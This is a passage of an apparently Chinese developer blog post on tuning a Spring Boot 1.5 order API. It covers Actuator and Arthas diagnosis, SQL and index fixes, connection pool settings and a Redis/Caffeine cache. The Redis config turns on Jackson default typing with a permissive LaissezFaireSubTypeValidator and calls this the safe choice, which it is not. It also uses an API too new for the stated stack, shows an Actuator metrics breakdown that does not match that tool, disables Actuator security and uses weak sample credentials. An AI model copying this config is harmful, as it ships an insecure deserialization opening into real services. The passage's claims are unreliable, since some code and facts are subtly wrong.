            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.commons<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>commons-pool2<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.6.2<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">dependencies</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">project</span>&gt;</span>
</code></pre>
<p><strong>注意：</strong> 如果项目中使用的是 <code>spring-boot-starter-redis</code>（旧版本），建议升级到 <code>spring-boot-starter-data-redis</code>，后者在 1.5.x 中更稳定。</p>
<h3 data-id="heading-6">二、调优前的性能诊断：找到真正的瓶颈</h3>
<h4 data-id="heading-7">2.1 问题现象：接口慢得像蜗牛</h4>
<p>先来看看优化前的性能数据：</p>









































<table><thead><tr><th>指标</th><th>优化前</th><th>优化后</th><th>提升幅度</th></tr></thead><tbody><tr><td>平均响应时间</td><td>3000ms</td><td>180ms</td><td><strong>优化后较优化前降低 94%</strong></td></tr><tr><td>P99 响应时间</td><td>8000ms</td><td>350ms</td><td><strong>优化后较优化前降低 95.6%</strong></td></tr><tr><td>QPS</td><td>100</td><td>1000</td><td><strong>优化后较优化前提升 900%</strong></td></tr><tr><td>错误率</td><td>5%</td><td>0.1%</td><td><strong>优化后较优化前降低 98%</strong></td></tr><tr><td>CPU 使用率</td><td>85%</td><td>45%</td><td><strong>优化后较优化前降低 47%</strong></td></tr></tbody></table>
<p>看到这个数据，我当时第一反应是：这接口到底在干什么？为什么这么慢？</p>
<h4 data-id="heading-8">2.2 诊断工具选型：Spring Boot 1.x 的兼容性坑</h4>
<p>在开始诊断之前，我先踩了一个大坑：想用 Spring Boot Actuator 2.x 的新功能，结果发现项目是 1.5.22，很多新特性都用不了。所以这里先给大家列一下 Spring Boot 1.x 能用的诊断工具：</p>
<p><strong>推荐工具清单（Spring Boot 1.x 兼容）：</strong></p>
<ul>
<li><strong>Spring Boot Actuator 1.x</strong>：查看接口耗时分布、JVM 指标</li>
<li><strong>Arthas 1.3.1</strong>：方法级性能分析、线程堆栈分析</li>
<li><strong>JVisualVM</strong>：JVM 内存、GC 分析</li>
<li><strong>MySQL 慢查询日志</strong>：SQL 性能分析</li>
<li><strong>JMeter</strong>：压测工具</li>
</ul>
<p><strong>不推荐（版本不兼容）：</strong></p>
<ul>
<li>Spring Boot Actuator 2.x（需要 Spring Boot 2.x）</li>
<li>Micrometer 1.4+（1.x 版本支持有限，建议用 1.3.9）</li>
<li>Spring Boot Admin 2.x</li>
</ul>
<h4 data-id="heading-9">2.3 ✅ 第一步：用 Actuator 定位慢接口</h4>
<p><strong>⚠️ 关键修正：</strong> Spring Boot 1.x 的 Actuator 配置与 2.x 完全不同，切勿混用！</p>
<p>首先，我在 <code>application.properties</code> 中开启了 Actuator 的监控端点（<strong>Spring Boot 1.5.x 专属配置</strong>）：</p>
<pre><code class="hljs language-properties" lang="properties"># Spring Boot 1.x Actuator 配置（1.5.22.RELEASE 验证可用）
# 注意：1.x 与 2.x Actuator 配置差异极大，切勿混用！

# 关闭安全验证（生产环境建议开启并配置用户名密码）
management.security.enabled=false

# 开启监控端点
endpoints.health.sensitive=false
endpoints.metrics.enabled=true
endpoints.prometheus.enabled=true

# 开启 HTTP 追踪（用于查看接口耗时）
management.trace.http.enabled=true
</code></pre>
<p><strong>补充说明：</strong> 1.x 版本中，端点配置使用 <code>endpoints.xxx</code> 格式，而不是 2.x 的 <code>management.endpoints.web.exposure.include</code>。如果使用 2.x 语法会报错。</p>
<p>然后访问 <code>http://localhost:8080/metrics</code>，看到了接口的耗时分布：</p>
<pre><code class="hljs language-erlang" lang="erlang">GET /api/order/<span class="hljs-keyword">query</span> - 平均耗时: <span class="hljs-number">2850</span>ms
  - 数据库查询: <span class="hljs-number">2200</span>ms (<span class="hljs-number">77</span><span class="hljs-comment">%)</span>
  - 业务逻辑: <span class="hljs-number">450</span>ms (<span class="hljs-number">16</span><span class="hljs-comment">%)</span>
  - 序列化: <span class="hljs-number">200</span>ms (<span class="hljs-number">7</span><span class="hljs-comment">%)</span>
</code></pre>
<p>看到这个数据，我心里有数了：<strong>数据库查询是最大的瓶颈，占了 77% 的时间</strong>。</p>
<h4 data-id="heading-10">2.4 ✅ 第二步：用 Arthas 深入方法级分析</h4>
<p>接下来，我用 Arthas 来查看具体是哪个方法在拖慢性能。这里又踩了一个坑：Arthas 在 Spring Boot 1.x 中启动时，如果端口被占用会报错。</p>
<p><strong>Arthas 启动命令（解决端口冲突）：</strong></p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 如果 3658 端口被占用，可以指定其他端口</span>
java -jar arthas-boot.jar --target-ip 0.0.0.0 --telnet-port 3658 --http-port 8563

<span class="hljs-comment"># 操作说明：执行后会列出所有 Java 进程，输入进程号，选择目标应用即可 attach</span>
</code></pre>
<p>启动后，我用 <code>trace</code> 命令追踪订单查询方法：</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 追踪 OrderService.queryOrder 方法</span>
trace com.example.service.OrderService queryOrder <span class="hljs-string">'#cost &gt; 100'</span>
</code></pre>
<p>输出结果让我发现了问题：</p>
<pre><code class="hljs language-scss" lang="scss">+---<span class="hljs-selector-attr">[100.00% 2850ms ]</span> com<span class="hljs-selector-class">.example</span><span class="hljs-selector-class">.service</span><span class="hljs-selector-class">.OrderService</span><span class="hljs-selector-class">.queryOrder</span>()
    +---<span class="hljs-selector-attr">[77.19% 2200ms ]</span> com<span class="hljs-selector-class">.example</span><span class="hljs-selector-class">.dao</span><span class="hljs-selector-class">.OrderMapper</span><span class="hljs-selector-class">.selectOrder</span>() 
    |   +---<span class="hljs-selector-attr">[45.23% 1295ms ]</span> com<span class="hljs-selector-class">.example</span><span class="hljs-selector-class">.dao</span><span class="hljs-selector-class">.OrderMapper</span><span class="hljs-selector-class">.selectOrderItems</span>()  # 循环查询！
    |   +---<span class="hljs-selector-attr">[31.96% 905ms  ]</span> com<span class="hljs-selector-class">.example</span><span class="hljs-selector-class">.dao</span><span class="hljs-selector-class">.OrderMapper</span><span class="hljs-selector-class">.selectOrderDetail</span>()
    +---<span class="hljs-selector-attr">[15.79% 450ms  ]</span> com<span class="hljs-selector-class">.example</span><span class="hljs-selector-class">.service</span><span class="hljs-selector-class">.OrderService</span><span class="hljs-selector-class">.processOrderData</span>()
    +---<span class="hljs-selector-attr">[7.02%  200ms  ]</span> com<span class="hljs-selector-class">.example</span><span class="hljs-selector-class">.util</span><span class="hljs-selector-class">.JsonUtil</span><span class="hljs-selector-class">.toJson</span>()
</code></pre>
<p><strong>关键发现：</strong></p>
<ol>
<li><code>selectOrderItems()</code> 方法耗时 1295ms，而且是在循环中调用的（<strong>N+1 查询问题</strong>）</li>
<li><code>selectOrderDetail()</code> 方法也慢，可能是 SQL 没有走索引</li>
</ol>
<p><strong>术语解释：N+1 查询问题</strong></p>
<ul>
<li><strong>通俗理解：</strong> 查 1 个订单（1 次查询）+ 循环查 10 个订单项（10 次查询）= 11 次查询，即 N+1（N=10）</li>
<li><strong>问题：</strong> 如果订单有 100 个商品，就要执行 101 次数据库查询，性能极差</li>
</ul>
<h4 data-id="heading-11">2.5 ✅ 第三步：分析 MySQL 慢查询日志</h4>
<p>开启 MySQL 慢查询日志：</p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-comment">-- 开启慢查询日志</span>
<span class="hljs-keyword">SET</span> <span class="hljs-keyword">GLOBAL</span> slow_query_log <span class="hljs-operator">=</span> <span class="hljs-string">'ON'</span>;
<span class="hljs-keyword">SET</span> <span class="hljs-keyword">GLOBAL</span> long_query_time <span class="hljs-operator">=</span> <span class="hljs-number">1</span>;  <span class="hljs-comment">-- 超过 1 秒的查询记录</span>
<span class="hljs-keyword">SET</span> <span class="hljs-keyword">GLOBAL</span> slow_query_log_file <span class="hljs-operator">=</span> <span class="hljs-string">'/var/log/mysql/slow-query.log'</span>;
</code></pre>
<p>查看慢查询日志，发现了几个问题 SQL：</p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-comment">-- 问题 SQL 1：全表扫描，没有走索引</span>
<span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> order_item <span class="hljs-keyword">WHERE</span> order_id <span class="hljs-operator">=</span> <span class="hljs-number">12345</span>;
<span class="hljs-comment">-- 执行时间: 1200ms，扫描行数: 50000</span>

<span class="hljs-comment">-- 问题 SQL 2：关联查询没有优化（注意：order 是 MySQL 关键字，需要加反引号）</span>
<span class="hljs-keyword">SELECT</span> o.<span class="hljs-operator">*</span>, u.name, u.phone 
<span class="hljs-keyword">FROM</span> `<span class="hljs-keyword">order</span>` o 
<span class="hljs-keyword">LEFT</span> <span class="hljs-keyword">JOIN</span> `<span class="hljs-keyword">user</span>` u <span class="hljs-keyword">ON</span> o.user_id <span class="hljs-operator">=</span> u.id 
<span class="hljs-keyword">WHERE</span> o.order_no <span class="hljs-operator">=</span> <span class="hljs-string">'ORD20240101001'</span>;
<span class="hljs-comment">-- 执行时间: 800ms，使用了临时表</span>
</code></pre>
<p><strong>⚠️ SQL 关键字修正：</strong> <code>order</code> 是 MySQL 关键字，表名必须加反引号 <code>`order`</code>，否则可能报错或执行异常。</p>
<h4 data-id="heading-12">2.6 第四步：JVM 问题排查</h4>
<p>用 JVisualVM 连接应用，发现 GC 非常频繁：</p>
<pre><code class="hljs language-diff" lang="diff">GC 统计（优化前）：
<span class="hljs-deletion">- Young GC 频率: 每 10 秒 1 次</span>
<span class="hljs-deletion">- Full GC 频率: 每 2 分钟 1 次</span>
<span class="hljs-deletion">- Full GC 平均耗时: 800ms</span>
<span class="hljs-deletion">- 堆内存使用率: 85%（接近 OOM 风险）</span>
</code></pre>
<p><strong>问题分析：</strong></p>
<ul>
<li>默认堆内存太小（只有 1g）</li>
<li>使用的是串行 GC（<code>-XX:+UseSerialGC</code>），不适合生产环境</li>
<li>对象创建频繁，导致 Young GC 压力大</li>
</ul>
<h4 data-id="heading-13">2.7 诊断总结：性能瓶颈清单</h4>
<p>经过一轮诊断，我整理出了性能瓶颈清单：</p>



































<table><thead><tr><th>瓶颈类型</th><th>影响程度</th><th>预估优化空间</th></tr></thead><tbody><tr><td>SQL 查询慢（N+1 问题）</td><td>⭐⭐⭐⭐⭐</td><td>70%</td></tr><tr><td>缺少缓存</td><td>⭐⭐⭐⭐</td><td>60%</td></tr><tr><td>JVM 配置不合理</td><td>⭐⭐⭐</td><td>30%</td></tr><tr><td>Tomcat 线程池配置低</td><td>⭐⭐</td><td>20%</td></tr><tr><td>代码层面优化</td><td>⭐⭐</td><td>15%</td></tr></tbody></table>
<p>接下来，我就按照"效果从易到难、成本从低到高"的原则，逐个击破这些瓶颈。</p>
<h3 data-id="heading-14">三、核心调优实战：分模块击破</h3>
<h4 data-id="heading-15">3.1 ✅ SQL 层优化：见效最快的优化</h4>
<h5 data-id="heading-16">问题 1：N+1 查询问题</h5>
<p><strong>问题原因：</strong>
原来的代码是这样的：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// OrderService.java（优化前）</span>
<span class="hljs-keyword">public</span> OrderVO <span class="hljs-title function_">queryOrder</span><span class="hljs-params">(String orderNo)</span> {
    <span class="hljs-comment">// 第一次查询：获取订单基本信息</span>
    <span class="hljs-type">Order</span> <span class="hljs-variable">order</span> <span class="hljs-operator">=</span> orderMapper.selectByOrderNo(orderNo);
    
    <span class="hljs-comment">// 第二次查询：循环查询订单商品（N+1 问题！）</span>
    <span class="hljs-comment">// 如果订单有 10 个商品，这里就要执行 10 次数据库查询</span>
    List&lt;OrderItem&gt; items = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();
    <span class="hljs-keyword">for</span> (Long itemId : order.getItemIds()) {
        <span class="hljs-type">OrderItem</span> <span class="hljs-variable">item</span> <span class="hljs-operator">=</span> orderItemMapper.selectById(itemId);  <span class="hljs-comment">// 循环查询数据库</span>
        items.add(item);
    }
    
    <span class="hljs-comment">// 第三次查询：查询订单详情</span>
    <span class="hljs-type">OrderDetail</span> <span class="hljs-variable">detail</span> <span class="hljs-operator">=</span> orderDetailMapper.selectByOrderId(order.getId());
    
    <span class="hljs-keyword">return</span> buildOrderVO(order, items, detail);
}
</code></pre>
<p>如果订单有 10 个商品，这个接口就要执行 1 + 10 + 1 = 12 次数据库查询！</p>
<p><strong>解决方案：批量查询代替循环查询</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// OrderService.java（优化后）</span>
<span class="hljs-keyword">public</span> OrderVO <span class="hljs-title function_">queryOrder</span><span class="hljs-params">(String orderNo)</span> {
    <span class="hljs-comment">// 第一次查询：获取订单基本信息</span>
    <span class="hljs-type">Order</span> <span class="hljs-variable">order</span> <span class="hljs-operator">=</span> orderMapper.selectByOrderNo(orderNo);
    <span class="hljs-keyword">if</span> (order == <span class="hljs-literal">null</span>) {
        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;
    }
    
    <span class="hljs-comment">// 第二次查询：批量查询订单商品（一次查询搞定）</span>
    <span class="hljs-comment">// 核心优化：批量查询替代循环查询，从 N+1 次查询降为 1 次</span>
    List&lt;OrderItem&gt; items = orderItemMapper.selectByIds(order.getItemIds());
    
    <span class="hljs-comment">// 第三次查询：查询订单详情</span>
    <span class="hljs-type">OrderDetail</span> <span class="hljs-variable">detail</span> <span class="hljs-operator">=</span> orderDetailMapper.selectByOrderId(order.getId());
    
    <span class="hljs-keyword">return</span> buildOrderVO(order, items, detail);
}
</code></pre>
<p><strong>MyBatis 批量查询实现：</strong></p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-comment">&lt;!-- OrderItemMapper.xml --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">select</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"selectByIds"</span> <span class="hljs-attr">resultType</span>=<span class="hljs-string">"OrderItem"</span>&gt;</span>
    SELECT * FROM order_item 
    WHERE id IN
    <span class="hljs-comment">&lt;!-- 核心优化：使用 foreach 实现批量查询 --&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">foreach</span> <span class="hljs-attr">collection</span>=<span class="hljs-string">"ids"</span> <span class="hljs-attr">item</span>=<span class="hljs-string">"id"</span> <span class="hljs-attr">open</span>=<span class="hljs-string">"("</span> <span class="hljs-attr">separator</span>=<span class="hljs-string">","</span> <span class="hljs-attr">close</span>=<span class="hljs-string">")"</span>&gt;</span>
        #{id}
    <span class="hljs-tag">&lt;/<span class="hljs-name">foreach</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">select</span>&gt;</span>
</code></pre>
<p><strong>效果对比：</strong></p>
<ul>
<li>优化前：12 次数据库查询，总耗时 2200ms</li>
<li>优化后：3 次数据库查询，总耗时 800ms</li>
<li><strong>提升：63.6%</strong></li>
</ul>
<h5 data-id="heading-17">问题 2：SQL 没有走索引</h5>
<p><strong>问题原因：</strong></p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-comment">-- 慢查询 SQL</span>
<span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> order_item <span class="hljs-keyword">WHERE</span> order_id <span class="hljs-operator">=</span> <span class="hljs-number">12345</span>;
<span class="hljs-comment">-- 执行计划：全表扫描，扫描了 50000 行</span>
</code></pre>
<p><strong>解决方案：添加联合索引</strong></p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-comment">-- 添加联合索引（订单ID + 商品ID）</span>
<span class="hljs-keyword">CREATE</span> INDEX idx_order_item_order_id <span class="hljs-keyword">ON</span> order_item(order_id, item_id);

<span class="hljs-comment">-- 优化后的执行计划：使用索引，只扫描 10 行</span>
EXPLAIN <span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> order_item <span class="hljs-keyword">WHERE</span> order_id <span class="hljs-operator">=</span> <span class="hljs-number">12345</span>;
<span class="hljs-comment">-- type: ref, rows: 10</span>
</code></pre>
<p><strong>效果对比：</strong></p>
<ul>
<li>优化前：全表扫描 50000 行，耗时 1200ms</li>
<li>优化后：索引扫描 10 行，耗时 15ms</li>
<li><strong>提升：98.75%</strong></li>
</ul>
<h5 data-id="heading-18">问题 3：关联查询优化</h5>
<p><strong>问题原因：</strong></p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-comment">-- 原来的关联查询（注意：order 是关键字，需要加反引号）</span>
<span class="hljs-keyword">SELECT</span> o.<span class="hljs-operator">*</span>, u.name, u.phone 
<span class="hljs-keyword">FROM</span> `<span class="hljs-keyword">order</span>` o 
<span class="hljs-keyword">LEFT</span> <span class="hljs-keyword">JOIN</span> `<span class="hljs-keyword">user</span>` u <span class="hljs-keyword">ON</span> o.user_id <span class="hljs-operator">=</span> u.id 
<span class="hljs-keyword">WHERE</span> o.order_no <span class="hljs-operator">=</span> <span class="hljs-string">'ORD20240101001'</span>;
<span class="hljs-comment">-- 使用了临时表，耗时 800ms</span>
</code></pre>
<p><strong>解决方案：优化 JOIN 顺序和索引</strong></p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-comment">-- 1. 确保 order_no 有唯一索引</span>
<span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">UNIQUE</span> INDEX uk_order_no <span class="hljs-keyword">ON</span> `<span class="hljs-keyword">order</span>`(order_no);

<span class="hljs-comment">-- 2. 确保 user.id 有主键索引（通常已有）</span>

<span class="hljs-comment">-- 3. 优化后的 SQL（MySQL 会自动优化 JOIN 顺序）</span>
<span class="hljs-keyword">SELECT</span> o.<span class="hljs-operator">*</span>, u.name, u.phone 
<span class="hljs-keyword">FROM</span> `<span class="hljs-keyword">order</span>` o 
<span class="hljs-keyword">LEFT</span> <span class="hljs-keyword">JOIN</span> `<span class="hljs-keyword">user</span>` u <span class="hljs-keyword">ON</span> o.user_id <span class="hljs-operator">=</span> u.id 
<span class="hljs-keyword">WHERE</span> o.order_no <span class="hljs-operator">=</span> <span class="hljs-string">'ORD20240101001'</span>;
<span class="hljs-comment">-- 执行计划：先通过索引找到 order，再 JOIN user，耗时 50ms</span>
</code></pre>
<p><strong>效果对比：</strong></p>
<ul>
<li>优化前：使用临时表，耗时 800ms</li>
<li>优化后：索引查询 + JOIN，耗时 50ms</li>
<li><strong>提升：93.75%</strong></li>
</ul>
<h5 data-id="heading-19">问题 4：避免 SELECT *</h5>
<p><strong>优化前：</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// 查询所有字段，包括不必要的大字段</span>
SELECT * FROM `order` <span class="hljs-type">WHERE</span> <span class="hljs-variable">order_no</span> <span class="hljs-operator">=</span> ?
</code></pre>
<p><strong>优化后：</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// 只查询需要的字段</span>
SELECT id, order_no, user_id, amount, status, create_time 
FROM `order` 
<span class="hljs-type">WHERE</span> <span class="hljs-variable">order_no</span> <span class="hljs-operator">=</span> ?
</code></pre>
<p><strong>效果：</strong> 减少网络传输和内存占用，响应时间减少约 10-15%</p>
<h5 data-id="heading-20">问题 5：数据源连接池优化</h5>
<p>Spring Boot 1.x 中，数据源配置在 <code>application.properties</code>：</p>
<pre><code class="hljs language-properties" lang="properties"># Spring Boot 1.x 数据源配置（Druid）
spring.datasource.type=com.alibaba.druid.pool.DruidDataSource
spring.datasource.url=jdbc:mysql://localhost:3306/order_db?useUnicode=true&amp;characterEncoding=utf8&amp;useSSL=false
spring.datasource.username=root
spring.datasource.password=123456

# 连接池配置（关键参数）
spring.datasource.druid.initial-size=10
spring.datasource.druid.min-idle=10
spring.datasource.druid.max-active=50
spring.datasource.druid.max-wait=3000
spring.datasource.druid.time-between-eviction-runs-millis=60000
spring.datasource.druid.min-evictable-idle-time-millis=300000
spring.datasource.druid.validation-query=SELECT 1
spring.datasource.druid.test-while-idle=true
spring.datasource.druid.test-on-borrow=false
spring.datasource.druid.test-on-return=false

# 开启 SQL 监控（用于诊断）
spring.datasource.druid.filters=stat,wall,log4j
</code></pre>
<p><strong>参数说明：</strong></p>
<ul>
<li><code>max-active=50</code>：最大连接数，根据服务器配置和并发量调整</li>
<li><code>max-wait=3000</code>：获取连接的最大等待时间（毫秒）</li>
<li><code>time-between-eviction-runs-millis</code>：连接池空闲连接回收的时间间隔</li>
</ul>
<p><strong>SQL 层优化总结：</strong></p>
<ul>
<li>响应时间：2200ms → 600ms</li>
<li><strong>提升：72.7%</strong></li>
</ul>
<hr/>
<h4 data-id="heading-21">3.2 ✅ 缓存层优化：性价比最高的优化</h4>
<h5 data-id="heading-22">问题：接口完全没有缓存</h5>
<p><strong>问题原因：</strong>
每次查询订单都要访问数据库，即使同一个订单被查询 100 次，也要执行 100 次 SQL。</p>
<p><strong>解决方案：二级缓存架构（本地缓存 + 分布式缓存）</strong></p>
<p>我设计了一个二级缓存架构：</p>
<ul>
<li><strong>L1 缓存（本地缓存）</strong>：用 Caffeine Cache，缓存热点数据，响应时间 &lt; 1ms（Caffeine 是 Guava Cache 的高性能替代品，性能提升约 30%）</li>
<li><strong>L2 缓存（分布式缓存）</strong>：用 Redis，缓存所有查询结果，响应时间 &lt; 10ms</li>
</ul>
<h5 data-id="heading-23">第一步：集成 Redis（Spring Boot 1.x 版本）</h5>
<p><strong>⚠️ 关键修正：</strong> Spring Boot 1.5.x 推荐使用 <code>spring-boot-starter-data-redis</code>，而不是 <code>spring-boot-starter-redis</code>（后者已废弃）。</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-comment">&lt;!-- pom.xml --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-starter-data-redis<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.5.22.RELEASE<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>
</code></pre>
<pre><code class="hljs language-properties" lang="properties"># application.properties
# Spring Boot 1.x Redis 配置
spring.redis.host=localhost
spring.redis.port=6379
spring.redis.password=
spring.redis.database=0
spring.redis.timeout=3000
spring.redis.pool.max-active=50
spring.redis.pool.max-idle=10
spring.redis.pool.min-idle=5
spring.redis.pool.max-wait=3000
</code></pre>
<p><strong>Redis 配置类（Spring Boot 1.x）：</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Configuration</span>
<span class="hljs-meta">@EnableCaching</span>  <span class="hljs-comment">// 开启缓存支持</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RedisConfig</span> {
    
    <span class="hljs-meta">@Bean</span>
    <span class="hljs-keyword">public</span> CacheManager <span class="hljs-title function_">cacheManager</span><span class="hljs-params">(RedisTemplate redisTemplate)</span> {
        <span class="hljs-type">RedisCacheManager</span> <span class="hljs-variable">cacheManager</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RedisCacheManager</span>(redisTemplate);
        <span class="hljs-comment">// 设置缓存过期时间：30 分钟</span>
        cacheManager.setDefaultExpiration(<span class="hljs-number">1800</span>);
        <span class="hljs-keyword">return</span> cacheManager;
    }
    
    <span class="hljs-meta">@Bean</span>
    <span class="hljs-keyword">public</span> RedisTemplate&lt;String, Object&gt; <span class="hljs-title function_">redisTemplate</span><span class="hljs-params">(RedisConnectionFactory factory)</span> {
        RedisTemplate&lt;String, Object&gt; template = <span class="hljs-keyword">new</span> <span class="hljs-title class_">RedisTemplate</span>&lt;&gt;();
        template.setConnectionFactory(factory);
        
        <span class="hljs-comment">// 使用 Jackson2JsonRedisSerializer 序列化</span>
        Jackson2JsonRedisSerializer&lt;Object&gt; serializer = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Jackson2JsonRedisSerializer</span>&lt;&gt;(Object.class);
        <span class="hljs-type">ObjectMapper</span> <span class="hljs-variable">om</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectMapper</span>();
        om.setVisibility(PropertyAccessor.ALL, JsonAutoDetect.Visibility.ANY);
        
        <span class="hljs-comment">// ⚠️ 关键修正：enableDefaultTyping 已废弃，使用替代方案</span>
        <span class="hljs-comment">// 替代方案：手动指定序列化类型，避免安全风险</span>
        om.activateDefaultTyping(
            LaissezFaireSubTypeValidator.instance, 
            ObjectMapper.DefaultTyping.NON_FINAL,
            JsonTypeInfo.As.PROPERTY
        );
        serializer.setObjectMapper(om);
        
        template.setValueSerializer(serializer);
        template.setKeySerializer(<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringRedisSerializer</span>());
        template.afterPropertiesSet();
        <span class="hljs-keyword">return</span> template;
    }
}
</code></pre>
<p><strong>补充说明：</strong> <code>enableDefaultTyping</code> 方法在 Jackson 2.10+ 中已废弃，存在安全风险。使用 <code>activateDefaultTyping</code> 替代，并指定 <code>LaissezFaireSubTypeValidator</code> 验证器。</p>
<h5 data-id="heading-24">第二步：实现二级缓存工具类</h5>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> com.github.benmanes.caffeine.cache.Cache;
<span class="hljs-keyword">import</span> com.github.benmanes.caffeine.cache.Caffeine;
<span class="hljs-keyword">import</span> org.springframework.beans.factory.annotation.Autowired;
<span class="hljs-keyword">import</span> org.springframework.data.redis.core.RedisTemplate;
<span class="hljs-keyword">import</span> org.springframework.stereotype.Component;
<span class="hljs-keyword">import</span> java.util.concurrent.TimeUnit;

<span class="hljs-meta">@Component</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TwoLevelCacheManager</span> {
    
    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> RedisTemplate&lt;String, Object&gt; redisTemplate;
    
    <span class="hljs-comment">// L1 缓存：Caffeine Cache（本地缓存，性能优于 Guava Cache）</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> Cache&lt;String, Object&gt; localCache = Caffeine.newBuilder()
            .maximumSize(<span class="hljs-number">1000</span>)  <span class="hljs-comment">// 最多缓存 1000 个 key</span>
            .expireAfterWrite(<span class="hljs-number">5</span>, TimeUnit.MINUTES)  <span class="hljs-comment">// 5 分钟过期</span>
            .recordStats()  <span class="hljs-comment">// 开启统计</span>
            .build();
    
    <span class="hljs-comment">/**
     * 获取缓存（先查 L1，再查 L2）
     */</span>
    <span class="hljs-keyword">public</span> &lt;T&gt; T <span class="hljs-title function_">get</span><span class="hljs-params">(String key, Class&lt;T&gt; type)</span> {
        <span class="hljs-comment">// 1. 先查本地缓存</span>
        <span class="hljs-type">Object</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> localCache.getIfPresent(key);
        <span class="hljs-keyword">if</span> (value != <span class="hljs-literal">null</span>) {
            <span class="hljs-keyword">return</span> (T) value;
        }
        
        <span class="hljs-comment">// 2. 再查 Redis</span>
        value = redisTemplate.opsForValue().get(key);
        <span class="hljs-keyword">if</span> (value != <span class="hljs-literal">null</span>) {
            <span class="hljs-comment">// 回填到本地缓存</span>
            localCache.put(key, value);
            <span class="hljs-keyword">return</span> (T) value;
        }
        
        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;
    }
    
    <span class="hljs-comment">/**
     * 设置缓存（同时写入 L1 和 L2）
     */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">put</span><span class="hljs-params">(String key, Object value, <span class="hljs-type">long</span> timeout, TimeUnit unit)</span> {
        <span class="hljs-comment">// 写入 Redis</span>
        redisTemplate.opsForValue().set(key, value, timeout, unit);
        <span class="hljs-comment">// 写入本地缓存</span>
        localCache.put(key, value);
    }
    
    <span class="hljs-comment">/**
     * 删除缓存（同时删除 L1 和 L2）
     */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">evict</span><span class="hljs-params">(String key)</span> {
        localCache.invalidate(key);
        redisTemplate.delete(key);
    }
}
</code></pre>
<p><strong>补充说明：</strong></p>
<ul>
<li><strong>为什么选择 Caffeine 而不是 Guava Cache？</strong>
<ul>
<li>Caffeine 是 Guava Cache 的高性能重写版本，性能提升约 30%</li>
<li>Caffeine 使用更高效的算法（如 W-TinyLFU），命中率更高</li>
<li>API 与 Guava Cache 兼容，迁移成本低</li>
<li>在 Spring Boot 2.x+ 中，Spring Cache 默认使用 Caffeine</li>
</ul>
</li>
<li><strong>为什么还需要 Guava？</strong> Guava 的布隆过滤器功能 Caffeine 不提供，所以需要同时引入 Guava 依赖用于布隆过滤器</li>
</ul>
<h5 data-id="heading-25">第三步：在 Service 层使用缓存</h5>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Service</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">OrderService</span> {
    
    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> OrderMapper orderMapper;
    
    <span class="hljs-meta">@Autowired</span>
